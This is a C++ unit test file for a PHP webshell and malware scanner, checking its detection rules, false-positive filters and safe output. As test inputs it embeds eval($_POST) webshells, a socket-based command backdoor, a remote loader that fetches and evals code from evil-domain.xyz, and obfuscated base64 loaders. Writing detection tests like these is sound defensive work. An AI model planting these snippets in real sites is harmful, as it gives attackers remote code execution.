#include <gtest/gtest.h>
#include "rules/Registry.hpp"
#include "config/Types.h"
#include "core/MatchEngine.h"
#include "utils/SafeText.h"

using namespace lyxbosa::rules;
using namespace lyxbosa;

// ============================================================================
// RuleCode Tests
// ============================================================================

TEST(RuleCodeTest, ParseValidCode) {
    auto code = RuleCode::parse("WS001");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::Webshell);
    EXPECT_EQ(code->number, 1);
}

TEST(RuleCodeTest, ParseCodeWithLargerNumber) {
    auto code = RuleCode::parse("RCE123");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::CodeExec);
    EXPECT_EQ(code->number, 123);
}

TEST(RuleCodeTest, ParseInvalidCode) {
    EXPECT_FALSE(RuleCode::parse("INVALID001").has_value());
    EXPECT_FALSE(RuleCode::parse("WS").has_value());
    EXPECT_FALSE(RuleCode::parse("123").has_value());
    EXPECT_FALSE(RuleCode::parse("").has_value());
}

TEST(RuleCodeTest, ToString) {
    RuleCode code{Category::Webshell, 1};
    EXPECT_EQ(code.toString(), "WS001");

    RuleCode code2{Category::CodeExec, 99};
    EXPECT_EQ(code2.toString(), "RCE099");
}

// ============================================================================
// Category Tests
// ============================================================================

TEST(CategoryTest, ParseCategory) {
    EXPECT_EQ(parseCategory("WS"), Category::Webshell);
    EXPECT_EQ(parseCategory("RCE"), Category::CodeExec);
    EXPECT_EQ(parseCategory("OBF"), Category::Obfuscation);
    EXPECT_FALSE(parseCategory("INVALID").has_value());
}

TEST(CategoryTest, CategoryInfo) {
    const auto& info = getCategoryInfo(Category::Webshell);
    EXPECT_EQ(info.code, "WS");
    EXPECT_EQ(info.name, "Webshell");
}

// ============================================================================
// Registry Tests
// ============================================================================

TEST(RegistryTest, GetRuleByCode) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);
    EXPECT_EQ(rule->name, "China Chopper webshell");
    EXPECT_EQ(rule->severity, Severity::Critical);
}

TEST(RegistryTest, GetRuleByInvalidCode) {
    auto* rule = getRuleByCode("INVALID999");
    EXPECT_EQ(rule, nullptr);
}

TEST(RegistryTest, GetRulesByCategory) {
    auto rules = getRulesByCategory(Category::Webshell);
    EXPECT_GT(rules.size(), 0);

    for (const auto* rule : rules) {
        EXPECT_EQ(rule->code.category, Category::Webshell);
    }
}

TEST(RegistryTest, GetAllRules) {
    const auto& allRules = getAllBuiltinRules();
    EXPECT_GT(allRules.size(), 0);
}

// ============================================================================
// Pattern Matching Tests - China Chopper (WS001)
// ============================================================================

TEST(WebshellTest, ChinaChopperMatches) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);

    // China Chopper patterns - direct eval/assert of POST data
    const char* sample1 = R"(<?php @eval($_POST['pass']);?>)";
    const char* sample2 = R"(<?php @eval ( $_POST [ 'x' ] ); ?>)";
    const char* sample3 = R"(<?php assert($_POST['cmd']);?>)";

    EXPECT_TRUE(rule->matches(sample1));
    EXPECT_TRUE(rule->matches(sample2));
    EXPECT_TRUE(rule->matches(sample3));

    auto results = rule->findMatches(sample1);
    EXPECT_GT(results.size(), 0);
}

TEST(WebshellTest, ChinaChopperZ0Param) {
    // WS002 is the z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("$_POST['z0']"));
    EXPECT_TRUE(rule->matches("$_REQUEST['z0']"));
}

TEST(WebshellTest, ChinaChopperNoFalsePositive) {
    // WS002 tests z0 param - normal params should NOT match
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    // Normal POST access should NOT match
    EXPECT_FALSE(rule->matches("$_POST['username']"));
    EXPECT_FALSE(rule->matches("$_POST['password']"));
}

// ============================================================================
// Pattern Matching Tests - Simple Backdoor patterns
// ============================================================================

TEST(WebshellTest, WSOWebshellMatches) {
    auto* rule = getRuleByCode("WS004");  // WSO webshell
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("WSO 2.0"));
    EXPECT_TRUE(rule->matches("Web Shell by oRb"));
}

// ============================================================================
// Pattern Matching Tests - Code Execution (RCE)
// ============================================================================

TEST(CodeExecTest, EvalBase64Matches) {
    auto* rule = getRuleByCode("RCE001");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(base64_decode($x));"));
    EXPECT_TRUE(rule->matches("eval( base64_decode( $data ) );"));
}

TEST(CodeExecTest, EvalGzinflateMatches) {
    auto* rule = getRuleByCode("RCE002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(gzinflate(base64_decode($x)));"));
    EXPECT_TRUE(rule->matches("eval( gzinflate( $data ));"));
}

TEST(CodeExecTest, DynamicEvalMatches) {
    // RCE003 is dynamic function with user input - $var($_GET[...])
    // Pattern requires statement boundary (newline, semicolon, etc.) before $var
    // This excludes method calls like $this->$method($_GET[...])
    auto* rule = getRuleByCode("RCE003");
    ASSERT_NE(rule, nullptr);

    // Realistic test cases with statement context
    EXPECT_TRUE(rule->matches("<?php\n$func($_POST['code']);"));
    EXPECT_TRUE(rule->matches("some_call(); $handler($_GET['x']);"));

    // Should NOT match method calls
    EXPECT_FALSE(rule->matches("$this->$method($_GET['ID']);"));
}

TEST(CodeExecTest, ShellExecMatches) {
    // RCE008 is shell_exec/system/passthru with user input
    auto* rule = getRuleByCode("RCE008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("shell_exec($_GET['cmd']);"));
    EXPECT_TRUE(rule->matches("passthru($_POST['c']);"));
    EXPECT_TRUE(rule->matches("system($_REQUEST['x']);"));
}

// ============================================================================
// False Positive Tests - Legitimate Code Should NOT Match
// ============================================================================

TEST(FalsePositiveTest, LegitimateUploadHandler) {
    // WS008 is malicious upload handler - user-controlled destination
    auto* rule = getRuleByCode("WS008");
    ASSERT_NE(rule, nullptr);

    // This is legitimate - destination is NOT from user input
    const char* legitimate = R"(
        move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $filename);
    )";

    EXPECT_FALSE(rule->matches(legitimate));
}

TEST(FalsePositiveTest, LegitimateEval) {
    auto* rule = getRuleByCode("RCE003");  // Dynamic eval
    ASSERT_NE(rule, nullptr);

    // eval with hardcoded string - NOT user input
    const char* legitimate = "eval('return 1 + 1;');";

    EXPECT_FALSE(rule->matches(legitimate));
}

// ============================================================================
// Match Position Tests
// ============================================================================

TEST(MatchPositionTest, SingleLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php $_POST['z0']; ?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 1);
    EXPECT_GT(results[0].column, 0);
}

TEST(MatchPositionTest, MultiLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php\n// comment\n$_POST['z0'];\n?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 3);  // Should be on line 3
}

// ============================================================================
// Dropper Rule Tests (DRP)
// ============================================================================

TEST(DropperTest, DRP007_LargeBase64Staging) {
    auto* rule = getRuleByCode("DRP007");
    ASSERT_NE(rule, nullptr);

    // Generate a string with 600+ base64 characters
    std::string base64_chars;
    for (int i = 0; i < 600; i++) base64_chars += "A";

    std::string malicious = "$data = base64_decode(\"" + base64_chars + "\");";
    EXPECT_TRUE(rule->matches(malicious)) << "DRP007 should match large base64 in variable";

    // Should NOT match small base64 strings
    EXPECT_FALSE(rule->matches("$x = base64_decode(\"SGVsbG8=\");"));

    // Test findMatches (used by scanner)
    auto results = rule->findMatches(malicious);
    EXPECT_GT(results.size(), 0) << "DRP007 findMatches should return results";
}

TEST(DropperTest, DRP008_ArchiveDropper) {
    auto* rule = getRuleByCode("DRP008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("file_put_contents(\"malware.zip\", $data);"));
    EXPECT_TRUE(rule->matches("file_put_contents('backdoor.tar.gz', $content);"));
    EXPECT_FALSE(rule->matches("file_put_contents(\"config.php\", $data);"));
}

// ============================================================================
// Backdoor Tests
// ============================================================================

TEST(BackdoorTest, BD016_Base64IncludeBackdoor) {
    auto* rule = getRuleByCode("BD016");
    ASSERT_NE(rule, nullptr);

    // Real-world WordPress template injection (exact pattern from the wild)
    EXPECT_TRUE(rule->matches(
        R"(<?php @include base64_decode("L3Zhci93d3cvdmhvc3RzL3dpem5ldC5nci9jdWx0cmFkaW8uZ3I=");?>)"));

    // With parentheses around include argument
    EXPECT_TRUE(rule->matches(
        R"(<?php @include(base64_decode("L3Zhci93d3cv"));?>)"));

    // include_once variant
    EXPECT_TRUE(rule->matches(
        R"(@include_once base64_decode("L3Zhci93d3cv");)"));

    // require variant
    EXPECT_TRUE(rule->matches(
        R"(@require base64_decode("L3Zhci93d3cv");)"));

    // require_once variant
    EXPECT_TRUE(rule->matches(
        R"(@require_once(base64_decode("L3Zhci93d3cv"));)"));

    // Without @ suppressor (still malicious)
    EXPECT_TRUE(rule->matches(
        R"(include base64_decode("L3Zhci93d3cv");)"));

    // With spaces between @ and include
    EXPECT_TRUE(rule->matches(
        R"(@ include base64_decode("L3Zhci93d3cv");)"));

    // False positives: legitimate base64_decode usage (not with include/require)
    EXPECT_FALSE(rule->matches(
        R"($data = base64_decode("SGVsbG8gV29ybGQ=");)"));
    EXPECT_FALSE(rule->matches(
        R"(echo base64_decode($encoded);)"));
    EXPECT_FALSE(rule->matches(
        R"(file_put_contents($path, base64_decode($data));)"));
}

TEST(BackdoorTest, BD017_HtaccessBackdoorWhitelist) {
    auto* rule = getRuleByCode("BD017");
    ASSERT_NE(rule, nullptr);

    // Real-world malicious .htaccess: deny all PHP, whitelist backdoor scripts
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \".(py|exe|php)$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"
        "<FilesMatch \"^(lock360.php|wp-l0gin.php|wp-the1me.php|wp-scr1pts.php|radio.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known backdoor name in FilesMatch (leet-speak)
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(wp-l0gin.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known shell name in FilesMatch
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(c99.php|r57.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // False positive: legitimate FilesMatch for security (blocking PHP uploads)
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.php$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"));

    // False positive: normal FilesMatch for caching
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.(css|js|png|jpg)$\">\n"
        "Header set Cache-Control \"max-age=604800\"\n"
        "</FilesMatch>\n"));
}

// ============================================================================
// Context Filter Tests - False Positive Reduction
// These test the MatchEngine's context-aware filtering via full match() calls
// ============================================================================

class ContextFilterTest : public ::testing::Test {
protected:
    lyxbosa::MatchEngine engine;

    void SetUp() override {
        engine.loadAllBuiltinRules();
    }

    // Helper: check if a specific rule code produced matches
    bool hasMatchForRule(const std::vector<lyxbosa::FileMatch>& matches, const std::string& ruleCode) {
        for (const auto& m : matches) {
            if (m.category == ruleCode) return true;
        }
        return false;
    }
};

// BD005: Should skip Monolog CubeHandler (vendor-prefixed path)
TEST_F(ContextFilterTest, BD005_SkipsMonologCubeHandler) {
    // Simulated Monolog CubeHandler content with socket_create + exec elsewhere
    const char* content =
        "<?php\n"
        "namespace Monolog\\Handler;\n"
        "class CubeHandler extends AbstractHandler {\n"
        "    private function connectUdp(): void {\n"
        "        $udpConnection = socket_create(AF_INET, SOCK_DGRAM, 0);\n"
        "        if (false === $udpConnection) {\n"
        "            throw new \\RuntimeException('Could not create socket');\n"
        "        }\n"
        "    }\n"
        "    protected function exec($cmd) { return $cmd; }\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/the-events-calendar/common/vendor-prefixed/monolog/monolog/src/Monolog/Handler/CubeHandler.php");
    EXPECT_FALSE(hasMatchForRule(matches, "BD005"))
        << "BD005 should be filtered out for Monolog CubeHandler";
}

// BD005: Should still detect real socket backdoors
TEST_F(ContextFilterTest, BD005_DetectsRealSocketBackdoor) {
    const char* content =
        "<?php\n"
        "$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n"
        "socket_connect($sock, $_GET['ip'], $_GET['port']);\n"
        "while($cmd = socket_read($sock, 2048)) {\n"
        "    $out = shell_exec($cmd);\n"
        "    socket_write($sock, $out);\n"
        "}\n";

    auto matches = engine.match(content, "wp-content/uploads/backdoor.php");
    EXPECT_TRUE(hasMatchForRule(matches, "BD005"))
        << "BD005 should detect real socket backdoor";
}

// OBF011: Should skip WPBakery rawurldecode(base64_decode(...))
TEST_F(ContextFilterTest, OBF011_SkipsWPBakeryJsComposer) {
    const char* content =
        "<?php\n"
        "function vc_value_from_safe($value) {\n"
        "    return rawurldecode(base64_decode(strip_tags($value)));\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/js_composer/include/helpers/helpers_factory.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out for WPBakery js_composer";
}

// OBF011: Should skip when htmlentities context (display code)
TEST_F(ContextFilterTest, OBF011_SkipsHtmlentitiesContext) {
    const char* content =
        "<?php\n"
        "$output = htmlentities(rawurldecode(base64_decode($value)), ENT_COMPAT, 'UTF-8');\n";

    auto matches = engine.match(content,
        "wp-content/themes/mytheme/functions.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out when htmlentities is on the same line";
}

// OBF011: Should still detect suspicious rawurldecode+base64 outside builders
TEST_F(ContextFilterTest, OBF011_DetectsSuspiciousUsage) {
    const char* content =
        "<?php\n"
        "$payload = rawurldecode(base64_decode($_POST['data']));\n"
        "eval($payload);\n";

    auto matches = engine.match(content, "wp-content/uploads/cache.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should detect suspicious rawurldecode+base64 in unknown files";
}

// OBF010: Should skip RevSlider compressed data import
TEST_F(ContextFilterTest, OBF010_SkipsRevSliderDataImport) {
    const char* content =
        "<?php\n"
        "function import_slider_data($data) {\n"
        "    $data = gzuncompress(base64_decode($data));\n"
        "    $_data = json_decode($data, true);\n"
        "    return (!empty($_data)) ? $_data : false;\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/functions.class.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should be filtered out for RevSlider data import";
}

// OBF010: Should still detect malicious gzuncompress+base64
TEST_F(ContextFilterTest, OBF010_DetectsMaliciousUsage) {
    const char* content =
        "<?php\n"
        "$code = gzuncompress(base64_decode($encoded));\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/tmp.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should detect malicious gzuncompress+base64 in unknown paths";
}

// DRP001: Should skip googleapis.com URL
TEST_F(ContextFilterTest, DRP001_SkipsGoogleApisUrl) {
    const char* content =
        "<?php\n"
        "$list_raw = file_get_contents('https://www.googleapis.com/webfonts/v1/webfonts?sort=popularity');\n"
        "// ... many lines of code ...\n"
        "function some_other_function() {\n"
        "    eval($template);\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/googlefonts.php");
    EXPECT_FALSE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should be filtered out for googleapis.com URL";
}

// DRP001: Should still detect real remote code loaders
TEST_F(ContextFilterTest, DRP001_DetectsRealRemoteLoader) {
    const char* content =
        "<?php\n"
        "$code = file_get_contents('https://evil-domain.xyz/payload.txt');\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/loader.php");
    EXPECT_TRUE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should detect real remote code loaders";
}

// ============================================================================
// Runtime string assembly (OBF024 / OBF025)
// The scanner folds string expressions, so detection does not depend on how
// the attacker chose to cut up the identifier.
// ============================================================================

class StringAssemblyTest : public ::testing::Test {
protected:
    // Returns the analyzer's notes for a rule, so tests can assert on what it resolved
    std::vector<std::string> notesFor(const char* content, const char* ruleCode) {
        const auto* rule = getRuleByCode(ruleCode);
        EXPECT_NE(rule, nullptr);

        std::vector<std::string> notes;
        if (!rule) return notes;

        for (const auto& match : rule->findMatches(content)) {
            notes.push_back(match.note);
        }
        return notes;
    }

    bool anyNoteContains(const std::vector<std::string>& notes, std::string_view needle) {
        for (const auto& note : notes) {
            if (note.find(needle) != std::string::npos) return true;
        }
        return false;
    }
};

// The injector that motivated this rule: fragments in separate variables,
// concatenated with more inline fragments, then called and eval'd.
TEST_F(StringAssemblyTest, DetectsFragmentedBase64DecodeLoader) {
    const char* content =
        "<?php ini_set(\"memory_limit\",\"-1\");\n"
        "$f=\"ba\"; $h=\"s\"; $l=\"e\"; $n=\"64\";\n"
        "$o=$f.$h.$l.$n.\"_d\".$l.\"cod\".$l;\n"
        "$p=\"Z290byBsQ1lHbw==\";\n"
        "eval($o($p));\n"
        "require __DIR__ . '/wp-blog-header.php';\n";

    auto notes = notesFor(content, "OBF024");
    ASSERT_FALSE(notes.empty());
    EXPECT_TRUE(anyNoteContains(notes, "\"base64_decode\""));
}

// Same technique, every other shape it comes in
TEST_F(StringAssemblyTest, DetectsAssemblyRegardlessOfTechnique) {
    struct Case {
        const char* content;
        const char* resolves;
    };

    const Case cases[] = {
        {"<?php $a=\"ev\"; $b=\"al\"; $c=$a.$b; $c($x);", "\"eval\""},
        {"<?php $s=\"as\"; $s .= \"sert\"; @$s($payload);", "\"assert\""},
        {"<?php $r = strrev(\"edoced_46esab\");", "\"base64_decode\""},
        {"<?php $i = implode(\"\", array(\"sy\",\"st\",\"em\"));", "\"system\""},
        {"<?php $t = str_replace(\"Q\",\"\",\"sQysQtQem\");", "\"system\""},
        {"<?php $h = chr(101).chr(118).chr(97).chr(108);", "\"eval\""},
        {"<?php $b = base64_decode(\"c2hlbGxfZXhlYw==\");", "\"shell_exec\""},
        {"<?php $p = pack(\"H*\", \"6576616c\");", "\"eval\""},
        {"<?php $v = \"_PO\".\"S\".\"T\"; $d = $$v;", "\"_POST\""},
    };

    for (const auto& testCase : cases) {
        auto notes = notesFor(testCase.content, "OBF024");
        EXPECT_TRUE(anyNoteContains(notes, testCase.resolves))
            << "Failed to resolve " << testCase.resolves << " in: " << testCase.content;
    }
}

// An assembled name that is not on the sensitive list still counts when the
// result is what gets called - that is what keeps the rule generic.
TEST_F(StringAssemblyTest, DetectsUnknownNameThatIsCalledDynamically) {
    const char* content =
        "<?php\n"
        "$g = \"my\".\"_Sec\".\"ret\".\"Fn\";\n"
        "$g($argument);\n";

    auto notes = notesFor(content, "OBF024");
    EXPECT_TRUE(anyNoteContains(notes, "\"my_SecretFn\""));
}

// A `.=` chain reports the finished name once, not every intermediate state
TEST_F(StringAssemblyTest, CollapsesAppendChainIntoOneFinding) {
    const char* content =
        "<?php\n"
        "$g='';$g.=\"b\";$g.=\"a\";$g.=\"se\";$g.=\"64\";$g.=\"_de\";$g.=\"code\";\n"
        "$g($data);\n";

    auto notes = notesFor(content, "OBF024");
    ASSERT_EQ(notes.size(), 1u);
    EXPECT_NE(notes[0].find("\"base64_decode\""), std::string::npos);
}

// A sensitive name split across exactly two literals is the weak signal:
// reported, but as OBF025 (medium) rather than OBF024 (critical)
TEST_F(StringAssemblyTest, PlainTwoLiteralSplitIsReportedSeparately) {
    const char* content =
        "<?php\n"
        "$fn = 'base64' . '_decode';\n"
        "return $fn($input);\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_FALSE(notesFor(content, "OBF025").empty());
}

// Ordinary concatenation must stay silent
TEST_F(StringAssemblyTest, NoFalsePositiveOnLegitimateConcatenation) {
    const char* content =
        "<?php\n"
        "class OrderExporter {\n"
        "    const PREFIX = 'order_';\n"
        "    public function build($row) {\n"
        "        $key = self::PREFIX . 'export';\n"
        "        $table = $this->db->prefix . 'orders';\n"
        "        $sql = 'SELECT id FROM ' . $table . ' WHERE status = 1';\n"
        "        $path = __DIR__ . '/../var/cache/' . $key . '.json';\n"
        "        $method = 'get' . ucfirst('total');\n"
        "        return $sql . $path . $method;\n"
        "    }\n"
        "}\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_TRUE(notesFor(content, "OBF025").empty());
}

// Parameter defaults are not assignments, and a folded value must be the whole
// right-hand side - both were false positives against Joomla's factories.
TEST_F(StringAssemblyTest, NoFalsePositiveOnFactoryClassNames) {
    const char* content =
        "<?php\n"
        "class BaseController {\n"
        "    public function getView($name = '', $type = '', $prefix = '') {\n"
        "        $class = ucfirst($prefix) . 'Controller' . ucfirst($type);\n"
        "        if (class_exists($class)) {\n"
        "            return new $class();\n"
        "        }\n"
        "    }\n"
        "    public function getLanguage($lang = '') {\n"
        "        $lang = $lang ?: $this->getDefaultLanguage();\n"
        "        $class = str_replace('-', '_', $lang . 'Localise');\n"
        "        return new $class();\n"
        "    }\n"
        "}\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_TRUE(notesFor(content, "OBF025").empty());
}

// Interpolated strings are not the literal text they are written as
TEST_F(StringAssemblyTest, IgnoresInterpolatedStrings) {
    const char* content =
        "<?php\n"
        "$a = \"ev\"; $b = \"al\";\n"
        "$c = \"$a\" . \"{$b}\";\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
}

// ============================================================================
// OBF036 - Binary payload inside a file that declares itself as text
// ============================================================================

class BinaryInTextTest : public ::testing::Test {
protected:
    // The analyzer sees content only; the extension gate lives in MatchEngine.
    bool fires(std::string_view content) {
        const auto* rule = getRuleByCode("OBF036");
        EXPECT_NE(rule, nullptr);
        if (!rule) return false;
        return !rule->findMatches(content).empty();
    }

    // A .php that carries an encrypted stage ahead of its source, as seen in
    // live-cleanup-batch3-quarantine/55e69bc987921bd7.php
    std::string blobThenPhp() {
        std::string s;
        for (int i = 0; i < 400; ++i) {
            s.push_back(static_cast<char>(1 + (i % 8)));   // C0 controls
            s.push_back(static_cast<char>('A' + (i % 26)));
        }
        s += "<?php goto vSHrlRg; $x = 1; ?>";
        return s;
    }

    bool gatedFor(std::string_view path, std::string_view content) {
        MatchContext ctx;
        ctx.content = content;
        ctx.filePath = path;
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = content.substr(0, 1);
        return MatchEngine::applyContextFilter("OBF036", ctx);
    }
};

TEST_F(BinaryInTextTest, FlagsBinaryBlobPrependedToSource) {
    EXPECT_TRUE(fires(blobThenPhp()));
}

TEST_F(BinaryInTextTest, IgnoresOrdinarySource) {
    EXPECT_FALSE(fires("<?php\n$a = 1;\nfunction f() { return 2; }\n"));
}

// The whole point of measuring C0 controls rather than "non-ASCII": UTF-8 text in
// any script must score zero. A rule that counted high bytes would flag every
// translation file in the tree.
TEST_F(BinaryInTextTest, IgnoresUtf8InEveryScript) {
    const char* samples[] = {
        "<?php // Καλωσορίσατε στο ξενοδοχείο μας, τιμές και κρατήσεις\n",
        "<?php // 日本語のテキストです。プラグイン設定を変更してください。\n",
        "<?php // 这是一个中文测试文件，用于验证编码处理是否正确。\n",
        "<?php // 한국어 텍스트입니다. 워드프레스 플러그인 설정.\n",
        "<?php // مرحبا بكم في موقعنا. هذا نص تجريبي باللغة العربية.\n",
        "<?php // שלום וברוכים הבאים לאתר שלנו. זהו טקסט לדוגמה.\n",
        "<?php // Это тестовый файл на русском языке для проверки.\n",
        "<?php // นี่คือข้อความภาษาไทยสำหรับทดสอบการเข้ารหัส\n",
        "<?php // यह एक हिंदी परीक्षण फ़ाइल है।\n",
        "<?php // Status: done, progress 100% \xF0\x9F\x8E\x89\xF0\x9F\x94\xA5\xE2\x9A\xA1\n",
        "<?php // \xF0\x9F\x91\xA8\xE2\x80\x8D\xF0\x9F\x91\xA9\xE2\x80\x8D\xF0\x9F\x91\xA7 ZWJ family\n",
        "<?php // \xE2\x94\x8C\xE2\x94\x80\xE2\x94\xAC\xE2\x94\x80\xE2\x94\x90 box drawing\n",
    };
    for (const auto* s : samples) {
        EXPECT_FALSE(fires(s)) << "UTF-8 text must never be read as a binary payload: " << s;
    }
}

// UTF-16 source is half NUL bytes by construction and must be exempted, or every
// UTF-16 file in a tree becomes a critical finding.
TEST_F(BinaryInTextTest, IgnoresUtf16WithBom) {
    std::string utf16le = "\xFF\xFE";
    const char* ascii = "<?php $a = 1; function f() { return 2; }";
    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
    EXPECT_FALSE(fires(utf16le));
}

TEST_F(BinaryInTextTest, IgnoresUtf16WithoutBom) {
    std::string utf16le;
    const char* ascii = "<?php $a = 1; function f() { return 2; } // padding text here";
    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
    EXPECT_FALSE(fires(utf16le));
}

TEST_F(BinaryInTextTest, IgnoresShortFiles) {
    EXPECT_FALSE(fires(std::string("\x01\x02\x03\x04", 4)));
}

// Extension gate: binary in .php is anomalous, binary in .png is the file format.
TEST_F(BinaryInTextTest, GateAcceptsTextExtensions) {
    auto blob = blobThenPhp();
    EXPECT_TRUE(gatedFor("/var/www/html/wp-content/cache/x.php", blob));
    EXPECT_TRUE(gatedFor("/var/www/html/assets/app.js", blob));
    EXPECT_TRUE(gatedFor("/var/www/html/index.HTML", blob));
}

TEST_F(BinaryInTextTest, GateRejectsBinaryFormats) {
    auto blob = blobThenPhp();
    EXPECT_FALSE(gatedFor("/var/www/html/img/logo.png", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/fonts/inter.woff2", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/media/clip.mp4", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/backup.zip", blob));
}

TEST_F(BinaryInTextTest, GateRejectsKnownBinaryBearingText) {
    auto blob = blobThenPhp();
    // Wordfence keeps WAF state as binary inside .php under wflogs/
    EXPECT_FALSE(gatedFor("/var/www/wp-content/wflogs/attack-data.php", blob));
    // SQL dumps legitimately carry BLOB literals
    EXPECT_FALSE(gatedFor("/var/www/backup/dump.sql", blob));
}

// ============================================================================
// DEFC001 - defacement signature must not fire on ordinary English prose
// ============================================================================

TEST(DefacementContextTest, IgnoresProseAfterHackedBy) {
    auto gate = [](std::string_view matched) {
        MatchContext ctx;
        ctx.content = matched;
        ctx.filePath = "/var/www/wp-content/plugins/wordfence/readme.txt";
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = matched;
        return MatchEngine::applyContextFilter("DEFC001", ctx);
    };

    // Wordfence readme.txt: "stops you from getting hacked by identifying malicious traffic"
    EXPECT_FALSE(gate("hacked by identifying"));
    EXPECT_FALSE(gate("hacked by exploiting"));
    EXPECT_FALSE(gate("Hacked By The"));

    // A real defacement names a handle
    EXPECT_TRUE(gate("Hacked By 7x1337"));
    EXPECT_TRUE(gate("hacked by MrX"));
}

// ============================================================================
// Untrusted output - findings quote malware, so nothing quoted may reach the
// terminal as a command. See utils/SafeText.h.
// ============================================================================

TEST(SafeTextTest, EscapesTerminalControlSequences) {
    using namespace lyxbosa::safe_text;

    // DA1: the terminal answers this on stdin, and the answer ends up typed at
    // the user's next shell prompt.
    EXPECT_EQ(sanitize("A\x1b[c" "B"), "A\\x1b[cB");
    // OSC 52 writes the analyst's clipboard.
    EXPECT_EQ(sanitize("\x1b]52;c;aGk=\x07"), "\\x1b]52;c;aGk=\\x07");
    EXPECT_EQ(sanitize(std::string("nul\0here", 8)), "nul\\x00here");
    EXPECT_EQ(sanitize("del\x7f"), "del\\x7f");
}

TEST(SafeTextTest, LeavesUtf8Alone) {
    using namespace lyxbosa::safe_text;

    // Same rule as OBF036: bytes >= 0x80 are UTF-8, not control codes. Mangling
    // them would wreck every finding quoted from a non-English file.
    for (std::string_view s : {"Καλωσορίσατε", "日本語のテキスト", "Это тест",
                               "مرحبا بكم", "\xF0\x9F\x8E\x89"}) {
        EXPECT_EQ(sanitize(s), std::string(s)) << s;
        EXPECT_FALSE(needsSanitizing(s)) << s;
    }
}

TEST(SafeTextTest, TruncationCannotLeaveADanglingEscape) {
    using namespace lyxbosa::safe_text;

    // The original bug: a quote cut at a fixed byte length could end in "\033["
    // and be completed by whatever was printed next.
    std::string in(40, 'A');
    in += "\x1b[";
    for (size_t limit = 8; limit < 60; ++limit) {
        std::string out = sanitizeAndTruncate(in, limit);
        EXPECT_EQ(out.find('\x1b'), std::string::npos) << "raw ESC survived at limit " << limit;
        // and never half of the "\xNN" we wrote in its place
        auto tail = out.size() >= 3 ? out.substr(out.size() - 3) : out;
        if (tail == "...") {
            std::string body = out.substr(0, out.size() - 3);
            auto bs = body.find_last_of('\\');
            if (bs != std::string::npos) {
                EXPECT_TRUE(body.size() - bs == 4 || body.find("\\x", bs) != bs)
                    << "half an escape left at limit " << limit;
            }
        }
    }
}

TEST(SafeTextTest, NeedsSanitizingDetectsOnlyControls) {
    using namespace lyxbosa::safe_text;
    EXPECT_FALSE(needsSanitizing("plain ascii ~!@#$%^&*()"));
    EXPECT_TRUE(needsSanitizing("has\x1b" "esc"));
    EXPECT_TRUE(needsSanitizing("has\ttab"));
}

// ============================================================================
